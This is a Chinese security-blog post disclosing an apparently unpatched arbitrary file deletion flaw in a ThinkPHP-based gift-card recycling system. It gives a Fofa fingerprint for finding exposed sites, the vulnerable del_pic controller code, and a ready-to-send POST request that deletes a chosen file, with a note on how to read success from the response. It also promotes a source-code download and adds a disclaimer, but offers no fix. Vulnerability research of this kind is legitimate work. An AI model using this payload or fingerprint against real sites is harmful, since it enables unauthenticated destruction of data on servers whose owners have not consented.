#  【0day】某礼品卡电子券收卡系统存在前台任意文件删除漏洞   
原创 Mstir  星悦安全   2025-03-08 13:26  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**一个先进、稳定、功能完善的回收交易平台， 通过技术对接，全面实现线上回收各类虚拟卡。销卡速度快，到账稳定。 解决浪费：直接面对用户回收 出户即可提交卡号卡密完成回收交易 解决每年上十亿礼品卡闲置的问题。 资金回流：让企业闲置、员工FULI、 亲友相赠等方式获取的礼品卡快速 变现，以达到资金回流化实现利益。 交易多样：提供线上回收、线下交易API接口等多种交易方式**  
  
****  
**1.支持PC+wap多端访问方式 2.支持多管理员总后台登录 3.支持前端用户多登录方式需要配置 4.多种礼品卡-商超-旅游卡-视频卡-餐券卡等支持 5.文章系统 6.公告系统 7.卡密回收模式 8.多种提现方式**  
  
****  
**Fofa指纹："/Application/Home/Static/css/style2.css"**  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNkiadvfRdqw1j0ySq6E9rhsEMX5dkwKLYC2vCauFBibMXR1gzu3FvH02QVx996Xud5ofchNX8Txiaw/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNkiadvfRdqw1j0ySq6E9rhAZcGX7Cbu7HsFmh4Ihiadg3RGjF79QztdvpNrhPaNAKfeiauIRAGxEXQ/640?wx_fmt=webp&from=appmsg "")  
  
**框架:ThinkPHP 3.2.3**  
## 0x01 漏洞研究&复现  
  
**位于 /Application/Home/Controller/UserController.class.php 控制器内的del_pic 方法存在unlink函数，且传参均可控，导致漏洞产生.**  
  
****```
//删除图片
public function del_pic(){
  $pic_url  = I('post.');
  $purl = ".".$pic_url['purl'];
  //echo $purl;
  if (file_exists($purl)) {
    $result=unlink($purl);
    echo $result;
  }else{
    echo "不在";
  }
}

```  
  
  
**Payload:**  
  
****```
POST /Home/user/del_pic HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 15
Content-Type: application/x-www-form-urlencoded
Cookie: think_language=zh-CN; PHPSESSID=he0qhohlf53m7vu33fp7ur87mo; a27adc0b9562e4f6168d897eefdf3902_ssl=6c9cfa24-c021-4009-8595-c1301fb0373f.fF3oRbTIZ6EYJcoaSfhkOW6qziY
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

purl=/aaa.txt

```  
  
回显为1 即为成功删除，回显 不在 则不存在该文件0x02 源码下载标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转礼品卡源码关注公众号发送 250308 获取!免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!  
